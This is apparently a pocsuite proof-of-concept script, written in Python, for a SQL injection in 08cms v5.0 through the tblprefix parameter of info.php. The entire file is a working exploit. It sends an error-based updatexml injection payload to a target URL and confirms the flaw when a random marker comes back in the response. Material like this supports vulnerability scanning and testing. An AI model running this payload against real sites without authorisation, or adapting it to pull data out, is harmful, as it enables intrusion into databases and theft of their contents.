#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import random
import time
import re
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    name = '08cms_v5.0 -  SQL Injection'
    vulID = '0'
    author = ['LRestless']
    vulType = 'sql-inj'
    version = '1'
    references = ['https://shuimugan.com/bug/view?bug_no=110861']
    desc = '''08cms_v5.0  info.php的tblprefix存在注入'''

    vulDate = '2015-06-18'
    createDate = '2019-03-19'
    updateDate = '2019-03-20'

    appName = '08cms'
    appVersion = '5.0'
    appPowerLink = 'http://www.08cms.com/product'
    samples = ['re']

    def _attack(self):
        """attack mode"""
        return self._verify()

    def _verify(self):
        """verify  mode"""
        result = {}
        s = req.Session()
        s.get(self.url)
        self.url = self.url + '/info.php?fid=1&tblprefix=cms_msession'
        payload1 = '/**/where/**/1/**/and/**/updatexml(1,concat(0x37,(select/**/'
        paylaod2 = '/**/limit/**/0,1)),1)%23'
        flag = "".join(random.choice(string.ascii_letters) for _ in xrange(0,8))
        flag = flag.lower()
        geturl = self.url + payload1 + flag + paylaod2
        resp = s.get(geturl)
        con = re.search(flag, resp.text)
        time.sleep(2)
        if con:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

